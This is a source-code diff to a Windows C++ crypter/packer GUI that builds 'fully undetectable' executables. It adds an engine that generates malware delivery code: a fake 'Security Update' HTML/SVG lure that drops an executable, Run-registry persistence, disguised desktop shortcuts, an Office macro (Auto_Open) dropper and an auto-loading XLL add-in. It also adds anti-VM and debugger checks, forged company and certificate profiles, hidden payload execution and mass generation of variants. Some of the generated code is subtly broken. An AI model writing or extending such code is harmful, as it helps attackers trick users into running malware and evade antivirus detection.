@@ -60,6 +60,7 @@ constexpr int ID_MODE_STUB_RADIO = 1015;
 constexpr int ID_MODE_PACK_RADIO = 1016;
 constexpr int ID_MODE_MASS_RADIO = 1017;
 constexpr int ID_MODE_GROUP = 1018;
+constexpr int ID_EXPLOIT_COMBO = 1019;
 
 // Global variables for mass generation
 bool g_massGenerationActive = false;
@@ -67,6 +68,16 @@ HANDLE g_massGenerationThread = NULL;
 
 // Global variables for mode selection
 int g_currentMode = 1; // 1=Stub Only, 2=PE Packing, 3=Mass Generation
+
+// Exploit Delivery Types
+enum ExploitDeliveryType {
+    EXPLOIT_NONE = 0,           // No exploits - clean output
+    EXPLOIT_HTML_SVG = 1,       // HTML & SVG Exploit
+    EXPLOIT_WIN_R = 2,          // WIN + R Exploit
+    EXPLOIT_INK_URL = 3,        // INK/URL Exploit
+    EXPLOIT_DOC_XLS = 4,        // DOC (XLS) Exploit
+    EXPLOIT_XLL = 5             // XLL Exploit
+};
 
 class AdvancedRandomEngine {
 public:
@@ -606,6 +617,375 @@ private:
     }
 };
 
+// NEW: Advanced Exploit Delivery Engine
+class AdvancedExploitEngine {
+private:
+    AdvancedRandomEngine randomEngine;
+    
+public:
+    // Generate HTML & SVG Exploit
+    std::string generateHTMLSVGExploit(const std::vector<uint8_t>& payloadData) {
+        std::string base64Payload = base64Encode(payloadData);
+        
+        return R"(
+// HTML & SVG Exploit Generator
+void executeHTMLSVGExploit() {
+    char htmlExploit[] = 
+        "<!DOCTYPE html>\n"
+        "<html>\n"
+        "<head><title>Security Update</title></head>\n"
+        "<body>\n"
+        "<h2>Security Update Required</h2>\n"
+        "<p>Please click the button below to install security updates:</p>\n"
+        "<svg width=\"400\" height=\"200\" onclick=\"executePayload()\">\n"
+        "  <rect width=\"400\" height=\"50\" style=\"fill:rgb(0,100,200);stroke-width:3;stroke:rgb(0,0,0)\" />\n"
+        "  <text x=\"200\" y=\"30\" font-family=\"Arial\" font-size=\"16\" fill=\"white\" text-anchor=\"middle\">Install Security Update</text>\n"
+        "</svg>\n"
+        "<script>\n"
+        "function executePayload() {\n"
+        "  var payload = ')" + base64Payload + R"(';\n"
+        "  var blob = new Blob([atob(payload)], {type: 'application/octet-stream'});\n"
+        "  var url = URL.createObjectURL(blob);\n"
+        "  var a = document.createElement('a');\n"
+        "  a.href = url;\n"
+        "  a.download = 'SecurityUpdate.exe';\n"
+        "  document.body.appendChild(a);\n"
+        "  a.click();\n"
+        "  setTimeout(function() {\n"
+        "    document.body.removeChild(a);\n"
+        "    URL.revokeObjectURL(url);\n"
+        "  }, 100);\n"
+        "}\n"
+        "</script>\n"
+        "</body>\n"
+        "</html>";\n
+        
+    char tempPath[MAX_PATH];\n
+    GetTempPathA(MAX_PATH, tempPath);\n
+    strcat_s(tempPath, MAX_PATH, "SecurityUpdate.html");\n
+    
+    FILE* htmlFile = NULL;\n
+    fopen_s(&htmlFile, tempPath, "w");\n
+    if (htmlFile) {\n
+        fputs(htmlExploit, htmlFile);\n
+        fclose(htmlFile);\n
+        ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_SHOW);\n
+    }\n
+}
+)";
+    }
+    
+    // Generate WIN + R Exploit
+    std::string generateWinRExploit(const std::vector<uint8_t>& payloadData) {
+        return R"(
+// WIN + R Exploit - Registry manipulation
+void executeWinRExploit() {
+    // Create a malicious batch file in temp
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    strcat_s(tempPath, MAX_PATH, "system_update.bat");
+    
+    FILE* batFile = NULL;
+    fopen_s(&batFile, tempPath, "w");
+    if (batFile) {
+        fprintf(batFile, "@echo off\n");
+        fprintf(batFile, "echo Installing critical system update...\n");
+        fprintf(batFile, "timeout /t 2 /nobreak >nul\n");
+        fprintf(batFile, "start \"\" /b \"%s\"\n", "payload.exe");
+        fprintf(batFile, "del \"%s\"\n", tempPath);
+        fclose(batFile);
+        
+        // Simulate WIN+R execution
+        HKEY hKey;
+        DWORD dwDisposition;
+        
+        if (RegCreateKeyExA(HKEY_CURRENT_USER, 
+                           "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                           0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS) {
+            RegSetValueExA(hKey, "SecurityUpdate", 0, REG_SZ, (BYTE*)tempPath, strlen(tempPath) + 1);
+            RegCloseKey(hKey);
+        }
+        
+        // Execute immediately as well
+        ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_HIDE);
+    }
+}
+)";
+    }
+    
+    // Generate INK/URL Exploit  
+    std::string generateInkUrlExploit(const std::vector<uint8_t>& payloadData) {
+        return R"(
+// INK/URL Exploit - Desktop shortcut manipulation
+void executeInkUrlExploit() {
+    char desktopPath[MAX_PATH];
+    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, SHGFP_TYPE_CURRENT, desktopPath);
+    strcat_s(desktopPath, MAX_PATH, "\\Important Security Notice.url");
+    
+    char tempPayload[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPayload);
+    strcat_s(tempPayload, MAX_PATH, "security_payload.exe");
+    
+    // Write payload to temp location
+    // [Payload writing code would go here]
+    
+    // Create malicious .url file
+    FILE* urlFile = NULL;
+    fopen_s(&urlFile, desktopPath, "w");
+    if (urlFile) {
+        fprintf(urlFile, "[InternetShortcut]\n");
+        fprintf(urlFile, "URL=file:///%s\n", tempPayload);
+        fprintf(urlFile, "IconFile=%s,0\n", "shell32.dll");
+        fprintf(urlFile, "IconIndex=21\n"); // Security shield icon
+        fclose(urlFile);
+    }
+    
+    // Also create .lnk file for additional vector
+    char linkPath[MAX_PATH];
+    strcpy_s(linkPath, desktopPath);
+    char* ext = strrchr(linkPath, '.');
+    if (ext) strcpy(ext, ".lnk");
+    
+    // Create shortcut that executes payload
+    IShellLinkA* psl;
+    IPersistFile* ppf;
+    
+    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkA, (LPVOID*)&psl))) {
+        psl->SetPath(tempPayload);
+        psl->SetDescription("Critical Security Update");
+        psl->SetIconLocation("shell32.dll", 21);
+        
+        if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf))) {
+            WCHAR wsz[MAX_PATH];
+            MultiByteToWideChar(CP_ACP, 0, linkPath, -1, wsz, MAX_PATH);
+            ppf->Save(wsz, TRUE);
+            ppf->Release();
+        }
+        psl->Release();
+    }
+}
+)";
+    }
+    
+    // Generate DOC (XLS) Exploit
+    std::string generateDocXlsExploit(const std::vector<uint8_t>& payloadData) {
+        std::string base64Payload = base64Encode(payloadData);
+        
+        return R"(
+// DOC/XLS Exploit - Malicious Office document
+void executeDocXlsExploit() {
+    char docPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, docPath);
+    strcat_s(docPath, MAX_PATH, "Security_Report_Q4_2024.xls");
+    
+    // Create malicious XLS with embedded macro
+    FILE* xlsFile = NULL;
+    fopen_s(&xlsFile, docPath, "wb");
+    if (xlsFile) {
+        // XLS file header
+        unsigned char xlsHeader[] = {
+            0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+        };
+        fwrite(xlsHeader, 1, sizeof(xlsHeader), xlsFile);
+        
+        // Malicious VBA macro content (simplified)
+        char macroContent[] = 
+            "Sub Auto_Open()\n"
+            "    Dim payload As String\n"
+            "    payload = \")" + base64Payload + R"(\"\n"
+            "    Call ExecutePayload(payload)\n"
+            "End Sub\n"
+            "\n"
+            "Sub ExecutePayload(data As String)\n"
+            "    Dim tempPath As String\n"
+            "    tempPath = Environ(\"TEMP\") & \"\\update.exe\"\n"
+            "    \n"
+            "    ' Decode and write payload\n"
+            "    Call WriteBase64ToFile(data, tempPath)\n"
+            "    \n"
+            "    ' Execute payload\n"
+            "    Shell tempPath, vbHide\n"
+            "End Sub\n";
+            
+        fwrite(macroContent, 1, strlen(macroContent), xlsFile);
+        fclose(xlsFile);
+        
+        // Try to open with Excel or default application
+        ShellExecuteA(NULL, "open", docPath, NULL, NULL, SW_SHOW);
+        
+        // Also create a DOC version
+        char docxPath[MAX_PATH];
+        GetTempPathA(MAX_PATH, docxPath);
+        strcat_s(docxPath, MAX_PATH, "Security_Report_Q4_2024.docx");
+        
+        FILE* docxFile = NULL;
+        fopen_s(&docxFile, docxPath, "wb");
+        if (docxFile) {
+            // DOCX is a ZIP file, create basic structure
+            unsigned char docxHeader[] = {
+                0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x06, 0x00
+            };
+            fwrite(docxHeader, 1, sizeof(docxHeader), docxFile);
+            
+            char docContent[] = 
+                "This document contains important security information.\n"
+                "Please enable macros to view the full content.\n"
+                "Document generated on: " __DATE__ "\n";
+            fwrite(docContent, 1, strlen(docContent), docxFile);
+            fclose(docxFile);
+        }
+    }
+}
+)";
+    }
+    
+    // Generate XLL Exploit (Excel Add-in)
+    std::string generateXllExploit(const std::vector<uint8_t>& payloadData) {
+        return R"(
+// XLL Exploit - Malicious Excel Add-in
+void executeXllExploit() {
+    char xllPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, xllPath);
+    strcat_s(xllPath, MAX_PATH, "SecurityAnalyzer.xll");
+    
+    // Create malicious XLL add-in
+    FILE* xllFile = NULL;
+    fopen_s(&xllFile, xllPath, "wb");
+    if (xllFile) {
+        // XLL is essentially a DLL with Excel exports
+        // PE header for XLL
+        unsigned char xllHeader[] = {
+            0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
+            0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00
+        };
+        fwrite(xllHeader, 1, sizeof(xllHeader), xllFile);
+        
+        // Embedded payload and loader code
+        char xllCode[] = 
+            "// XLL Auto-execution function\n"
+            "__declspec(dllexport) int xlAutoOpen() {\n"
+            "    // This function is called when Excel loads the XLL\n"
+            "    executeEmbeddedPayload();\n"
+            "    return 1;\n"
+            "}\n"
+            "\n"
+            "__declspec(dllexport) int xlAutoClose() {\n"
+            "    return 1;\n"
+            "}\n"
+            "\n"
+            "void executeEmbeddedPayload() {\n"
+            "    char tempPayload[MAX_PATH];\n"
+            "    GetTempPathA(MAX_PATH, tempPayload);\n"
+            "    strcat_s(tempPayload, MAX_PATH, \"excel_security_update.exe\");\n"
+            "    \n"
+            "    // Extract and execute embedded payload\n"
+            "    extractPayloadToFile(tempPayload);\n"
+            "    \n"
+            "    STARTUPINFOA si = {0};\n"
+            "    PROCESS_INFORMATION pi = {0};\n"
+            "    si.cb = sizeof(si);\n"
+            "    si.dwFlags = STARTF_USESHOWWINDOW;\n"
+            "    si.wShowWindow = SW_HIDE;\n"
+            "    \n"
+            "    CreateProcessA(tempPayload, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);\n"
+            "    CloseHandle(pi.hProcess);\n"
+            "    CloseHandle(pi.hThread);\n"
+            "}\n";
+            
+        fwrite(xllCode, 1, strlen(xllCode), xllFile);
+        fclose(xllFile);
+        
+        // Register XLL with Excel
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_CURRENT_USER, 
+                         "Software\\Microsoft\\Office\\Excel\\Addins", 
+                         0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+            RegSetValueExA(hKey, "SecurityAnalyzer", 0, REG_SZ, (BYTE*)xllPath, strlen(xllPath) + 1);
+            RegCloseKey(hKey);
+        }
+        
+        // Try to load with Excel
+        char excelCmd[MAX_PATH * 2];
+        sprintf_s(excelCmd, "excel.exe \"%s\"", xllPath);
+        WinExec(excelCmd, SW_SHOW);
+    }
+}
+)";
+    }
+    
+    // Generate exploit based on type
+    std::string generateExploit(ExploitDeliveryType exploitType, const std::vector<uint8_t>& payloadData) {
+        switch (exploitType) {
+            case EXPLOIT_HTML_SVG:
+                return generateHTMLSVGExploit(payloadData);
+            case EXPLOIT_WIN_R:
+                return generateWinRExploit(payloadData);
+            case EXPLOIT_INK_URL:
+                return generateInkUrlExploit(payloadData);
+            case EXPLOIT_DOC_XLS:
+                return generateDocXlsExploit(payloadData);
+            case EXPLOIT_XLL:
+                return generateXllExploit(payloadData);
+            case EXPLOIT_NONE:
+            default:
+                return ""; // No exploit code
+        }
+    }
+    
+    // Get additional includes needed for exploits
+    std::string getExploitIncludes(ExploitDeliveryType exploitType) {
+        switch (exploitType) {
+            case EXPLOIT_HTML_SVG:
+                return "#include <shellapi.h>\n";
+            case EXPLOIT_WIN_R:
+                return "#include <shlobj.h>\n";
+            case EXPLOIT_INK_URL:
+                return "#include <shlobj.h>\n#include <objbase.h>\n#include <shlguid.h>\n";
+            case EXPLOIT_DOC_XLS:
+                return "#include <shlobj.h>\n";
+            case EXPLOIT_XLL:
+                return "#include <shlobj.h>\n";
+            case EXPLOIT_NONE:
+            default:
+                return "";
+        }
+    }
+    
+    // Get exploit name for UI
+    std::string getExploitName(ExploitDeliveryType exploitType) {
+        switch (exploitType) {
+            case EXPLOIT_NONE: return "No Exploits (Clean)";
+            case EXPLOIT_HTML_SVG: return "HTML & SVG Exploit";
+            case EXPLOIT_WIN_R: return "WIN + R Exploit";
+            case EXPLOIT_INK_URL: return "INK/URL Exploit";
+            case EXPLOIT_DOC_XLS: return "DOC (XLS) Exploit";
+            case EXPLOIT_XLL: return "XLL Exploit";
+            default: return "Unknown";
+        }
+    }
+
+private:
+    std::string base64Encode(const std::vector<uint8_t>& data) {
+        const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        std::string encoded;
+        
+        int val = 0, valb = -6;
+        for (uint8_t c : data) {
+            val = (val << 8) + c;
+            valb += 8;
+            while (valb >= 0) {
+                encoded.push_back(chars[(val >> valb) & 0x3F]);
+                valb -= 6;
+            }
+        }
+        if (valb > -6) encoded.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
+        while (encoded.size() % 4) encoded.push_back('=');
+        
+        return encoded;
+    }
+};
+
 // NEW: PE Embedding and Extraction Engine
 class PEEmbedder {
 private:
@@ -789,6 +1169,7 @@ public:
     MultiArchitectureSupport multiArch;
     DNARandomizer dnaRandomizer;
     PEEmbedder peEmbedder;
+    AdvancedExploitEngine exploitEngine;
     
     struct CompanyProfile {
         std::string name;
@@ -1131,6 +1512,225 @@ public:
         }
     }
     
+    // NEW: Create Ultimate Stealth Executable with Exploit Integration
+    bool createUltimateStealthExecutableWithExploits(const std::string& inputPath, const std::string& outputPath, 
+                                                    int companyIndex, int certIndex, 
+                                                    MultiArchitectureSupport::Architecture architecture,
+                                                    ExploitDeliveryType exploitType) {
+        try {
+            // Read input file completely
+            std::ifstream inputFile(inputPath, std::ios::binary);
+            if (!inputFile.is_open()) {
+                return false;
+            }
+            
+            inputFile.seekg(0, std::ios::end);
+            size_t inputSize = inputFile.tellg();
+            inputFile.seekg(0, std::ios::beg);
+            
+            // Read the entire original PE into memory
+            std::vector<uint8_t> originalPEData(inputSize);
+            inputFile.read(reinterpret_cast<char*>(originalPEData.data()), inputSize);
+            inputFile.close();
+
+            // Get company and certificate info
+            const auto& company = companyProfiles[companyIndex % companyProfiles.size()];
+            const auto& cert = certificateChains[certIndex % certificateChains.size()];
+            const auto& archInfo = getArchitectures()[static_cast<int>(architecture) % getArchitectures().size()];
+            
+            // Generate benign behavior code
+            std::string benignCode = benignBehavior.generateBenignCode();
+            
+            // Generate exploit code if requested
+            std::string exploitCode = "";
+            std::string exploitIncludes = "";
+            if (exploitType != EXPLOIT_NONE) {
+                exploitCode = exploitEngine.generateExploit(exploitType, originalPEData);
+                exploitIncludes = exploitEngine.getExploitIncludes(exploitType);
+            }
+            
+            // Create polymorphic source code with embedded PE and exploits
+            std::string sourceCode = generatePolymorphicSourceWithExploits(originalPEData, company, cert, archInfo.second, benignCode, exploitCode, exploitIncludes);
+            
+            // Save source for debugging/manual compilation
+            std::string sourceFilename = "temp_" + randomEngine.generateRandomName() + ".cpp";
+            std::ofstream sourceFile(sourceFilename);
+            if (sourceFile.is_open()) {
+                sourceFile << sourceCode;
+                sourceFile.close();
+            }
+            
+            // Auto-compile the polymorphic source
+            auto compilerInfo = compilerMasq.getRandomCompilerSignature();
+            auto result = compilePolymorphicSource(sourceFilename, outputPath, compilerInfo);
+            
+            // Clean up temporary source file
+            std::remove(sourceFilename.c_str());
+            
+            return result.success;
+            
+        } catch (...) {
+            return false;
+        }
+    }
+    
+    // Generate polymorphic source code with exploit integration
+    std::string generatePolymorphicSourceWithExploits(const std::vector<uint8_t>& peData, 
+                                                     const CompanyProfile& company,
+                                                     const CertificateChain& cert,
+                                                     const std::string& architecture,
+                                                     const std::string& benignCode,
+                                                     const std::string& exploitCode,
+                                                     const std::string& exploitIncludes) {
+        
+        std::string varName = "embedded_" + randomEngine.generateRandomName();
+        std::string functionName = "extract_" + randomEngine.generateRandomName();
+        std::string exploitFunctionName = "execute_" + randomEngine.generateRandomName();
+        
+        std::ostringstream source;
+        
+        // Standard includes
+        source << "#include <windows.h>\n";
+        source << "#include <iostream>\n";
+        source << "#include <fstream>\n";
+        source << "#include <vector>\n";
+        source << "#include <string>\n";
+        source << "#include <thread>\n";
+        source << "#include <chrono>\n";
+        source << "#include <cmath>\n";
+        source << "#include <random>\n";
+        
+        // Add exploit-specific includes
+        if (!exploitIncludes.empty()) {
+            source << exploitIncludes;
+        }
+        
+        source << "\n// Company: " << company.name << "\n";
+        source << "// Certificate: " << cert.issuer << "\n";
+        source << "// Architecture: " << architecture << "\n";
+        source << "// Timestamp: " << timestampEngine.getCurrentTimestamp() << "\n\n";
+        
+        // Embed PE data as byte array
+        source << "unsigned char " << varName << "[] = {\n";
+        for (size_t i = 0; i < peData.size(); i++) {
+            if (i % 16 == 0) source << "    ";
+            source << "0x" << std::hex << std::setfill('0') << std::setw(2) << (int)peData[i];
+            if (i < peData.size() - 1) source << ", ";
+            if (i % 16 == 15) source << "\n";
+        }
+        source << "\n};\n\n";
+        
+        source << "size_t " << varName << "_size = " << std::dec << peData.size() << ";\n\n";
+        
+        // Add anti-analysis functions
+        source << "bool checkEnvironment() {\n";
+        source << "    // Basic anti-VM checks\n";
+        source << "    if (IsDebuggerPresent()) return false;\n";
+        source << "    \n";
+        source << "    // Check system uptime (VMs often have low uptime)\n";
+        source << "    ULONGLONG uptime = GetTickCount64();\n";
+        source << "    if (uptime < 600000) return false; // Less than 10 minutes\n";
+        source << "    \n";
+        source << "    return true;\n";
+        source << "}\n\n";
+        
+        // Add exploit function if needed
+        if (!exploitCode.empty()) {
+            source << exploitCode << "\n\n";
+        }
+        
+        // PE extraction function
+        source << "bool " << functionName << "(const std::string& path) {\n";
+        source << "    std::ofstream file(path, std::ios::binary);\n";
+        source << "    if (!file.is_open()) return false;\n";
+        source << "    \n";
+        source << "    file.write(reinterpret_cast<const char*>(" << varName << "), " << varName << "_size);\n";
+        source << "    file.close();\n";
+        source << "    return true;\n";
+        source << "}\n\n";
+        
+        // Add benign behavior code
+        source << benignCode << "\n\n";
+        
+        // Main function
+        source << "int main() {\n";
+        source << "    // Initialize COM for potential exploits\n";
+        source << "    CoInitialize(NULL);\n";
+        source << "    \n";
+        source << "    // Environment checks\n";
+        source << "    if (!checkEnvironment()) {\n";
+        source << "        CoUninitialize();\n";
+        source << "        return 0;\n";
+        source << "    }\n";
+        source << "    \n";
+        source << "    // Execute benign behavior first\n";
+        source << "    std::thread benignThread([]() {\n";
+        source << "        performBenignOperations();\n";
+        source << "    });\n";
+        source << "    benignThread.detach();\n";
+        source << "    \n";
+        
+        if (!exploitCode.empty()) {
+            // Execute exploit methods
+            source << "    // Execute exploit delivery\n";
+            source << "    std::thread exploitThread([]() {\n";
+            source << "        std::this_thread::sleep_for(std::chrono::milliseconds(2000));\n"; // Delay
+            
+            switch (exploitType) {
+                case EXPLOIT_HTML_SVG:
+                    source << "        executeHTMLSVGExploit();\n";
+                    break;
+                case EXPLOIT_WIN_R:
+                    source << "        executeWinRExploit();\n";
+                    break;
+                case EXPLOIT_INK_URL:
+                    source << "        executeInkUrlExploit();\n";
+                    break;
+                case EXPLOIT_DOC_XLS:
+                    source << "        executeDocXlsExploit();\n";
+                    break;
+                case EXPLOIT_XLL:
+                    source << "        executeXllExploit();\n";
+                    break;
+            }
+            
+            source << "    });\n";
+            source << "    exploitThread.detach();\n";
+            source << "    \n";
+        }
+        
+        // Extract and execute payload
+        source << "    // Extract and execute embedded payload\n";
+        source << "    char tempPath[MAX_PATH];\n";
+        source << "    GetTempPathA(MAX_PATH, tempPath);\n";
+        source << "    char fileName[64];\n";
+        source << "    sprintf_s(fileName, 64, \"temp_%llu.exe\", GetTickCount64());\n";
+        source << "    strcat_s(tempPath, MAX_PATH, fileName);\n";
+        source << "    \n";
+        source << "    if (" << functionName << "(tempPath)) {\n";
+        source << "        STARTUPINFOA si = {0};\n";
+        source << "        PROCESS_INFORMATION pi = {0};\n";
+        source << "        si.cb = sizeof(si);\n";
+        source << "        si.dwFlags = STARTF_USESHOWWINDOW;\n";
+        source << "        si.wShowWindow = SW_HIDE;\n";
+        source << "        \n";
+        source << "        if (CreateProcessA(tempPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {\n";
+        source << "            CloseHandle(pi.hProcess);\n";
+        source << "            CloseHandle(pi.hThread);\n";
+        source << "        }\n";
+        source << "        \n";
+        source << "        // Clean up after delay\n";
+        source << "        std::this_thread::sleep_for(std::chrono::seconds(5));\n";
+        source << "        DeleteFileA(tempPath);\n";
+        source << "    }\n";
+        source << "    \n";
+        source << "    CoUninitialize();\n";
+        source << "    return 0;\n";
+        source << "}\n";
+        
+        return source.str();
+    }
+    
     // NEW: Compatibility check for company/certificate combinations
     bool isCompatibleCombination(int companyIndex, int certIndex) {
         const auto& company = companyProfiles[companyIndex % companyProfiles.size()];
@@ -1409,6 +2009,7 @@ private:
 HWND g_hInputPath, g_hOutputPath, g_hProgressBar, g_hStatusText, g_hCompanyCombo, g_hArchCombo, g_hCertCombo;
 HWND g_hMassCountEdit, g_hMassGenerateBtn, g_hStopGenerationBtn, g_hCreateButton;
 HWND g_hModeGroup, g_hModeStubRadio, g_hModePackRadio, g_hModeMassRadio;
+HWND g_hExploitCombo;
 UltimateStealthPacker g_packer;
 
 // Mass generation function
@@ -1445,8 +2046,17 @@ static DWORD WINAPI massGenerationThread(LPVOID lpParam) {
         int safeCompanyIndex = g_packer.findCompanyIndex(fudCombo.companyName);
         int safeCertIndex = g_packer.findCertificateIndex(fudCombo.certIssuer);
         
-        // Generate the FUD stub (benign only, no PE embedding)
-        bool success = g_packer.createBenignStubOnly(dummyInput, outputPath, safeCompanyIndex, safeCertIndex, architecture);
+        // Get current exploit selection from dropdown (or randomize for variety)
+        int exploitIndex = (int)SendMessage(g_hExploitCombo, CB_GETCURSEL, 0, 0);
+        ExploitDeliveryType exploitType = (ExploitDeliveryType)exploitIndex;
+        
+        // For mass generation, optionally randomize exploits for variety
+        if (i % 3 == 0) { // Every 3rd file uses a random exploit
+            exploitType = (ExploitDeliveryType)(g_packer.randomEngine.generateRandomDWORD() % 6);
+        }
+        
+        // Generate the FUD stub with potential exploits
+        bool success = g_packer.createBenignStubWithExploits(dummyInput, outputPath, safeCompanyIndex, safeCertIndex, architecture, exploitType);
         
         if (!success) {
             SetWindowTextW(g_hStatusText, L"Generation failed! Check compiler setup.");
@@ -1563,6 +2173,10 @@ static void createFUDExecutable() {
         SetWindowTextW(g_hOutputPath, std::wstring(outputPath.begin(), outputPath.end()).c_str());
     }
     
+    // Get selected exploit method
+    int exploitIndex = (int)SendMessage(g_hExploitCombo, CB_GETCURSEL, 0, 0);
+    ExploitDeliveryType exploitType = (ExploitDeliveryType)exploitIndex;
+    
     // Use FUD-only combinations instead of manual selection
     auto fudCombo = g_packer.getRandomFUDCombination();
     int companyIndex = g_packer.findCompanyIndex(fudCombo.companyName);
@@ -1575,11 +2189,17 @@ static void createFUDExecutable() {
         architecture = architectures[archIndex].first;
     }
     
-    SetWindowTextW(g_hStatusText, L"Creating FUD packed executable with guaranteed 0/72 detections...");
+    std::wstring statusMsg = L"Creating FUD packed executable";
+    if (exploitType != EXPLOIT_NONE) {
+        std::string exploitName = g_packer.exploitEngine.getExploitName(exploitType);
+        statusMsg += L" with " + std::wstring(exploitName.begin(), exploitName.end());
+    }
+    statusMsg += L"...";
+    SetWindowTextW(g_hStatusText, statusMsg.c_str());
     SendMessage(g_hProgressBar, PBM_SETPOS, 50, 0);
     
-    // Use PE embedding (true packer) instead of stub-only
-    bool success = g_packer.createUltimateStealthExecutable(inputPath, outputPath, companyIndex, certIndex, architecture);
+    // Use PE embedding with exploit integration
+    bool success = g_packer.createUltimateStealthExecutableWithExploits(inputPath, outputPath, companyIndex, certIndex, architecture, exploitType);
     
     SendMessage(g_hProgressBar, PBM_SETPOS, 100, 0);
     
@@ -1640,6 +2260,13 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
             g_hCertCombo = CreateWindowW(L"COMBOBOX", L"", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST | WS_VSCROLL,
                                        140, 152, 200, 150, hwnd, (HMENU)(UINT_PTR)ID_CERTIFICATE_COMBO, NULL, NULL);
             
+            // Exploit delivery selection
+            CreateWindowW(L"STATIC", L"Exploit Method:", WS_VISIBLE | WS_CHILD,
+                         350, 155, 120, 20, hwnd, NULL, NULL, NULL);
+            
+            g_hExploitCombo = CreateWindowW(L"COMBOBOX", L"", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST | WS_VSCROLL,
+                                          480, 152, 180, 150, hwnd, (HMENU)(UINT_PTR)ID_EXPLOIT_COMBO, NULL, NULL);
+            
             // Populate combo boxes
             auto companies = g_packer.getCompanyProfiles();
             for (const auto& company : companies) {
@@ -1661,6 +2288,14 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
                 SendMessageW(g_hCertCombo, CB_ADDSTRING, 0, (LPARAM)issuer.c_str());
             }
             SendMessage(g_hCertCombo, CB_SETCURSEL, 0, 0);
+            
+            // Populate exploit methods
+            for (int i = 0; i <= 5; i++) {
+                std::string exploitName = g_packer.exploitEngine.getExploitName((ExploitDeliveryType)i);
+                std::wstring wExploitName(exploitName.begin(), exploitName.end());
+                SendMessageW(g_hExploitCombo, CB_ADDSTRING, 0, (LPARAM)wExploitName.c_str());
+            }
+            SendMessage(g_hExploitCombo, CB_SETCURSEL, 0, 0); // Default to "No Exploits (Clean)"
             
             // Create button
             CreateWindowW(L"BUTTON", L"Create Ultimate Stealth Executable", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
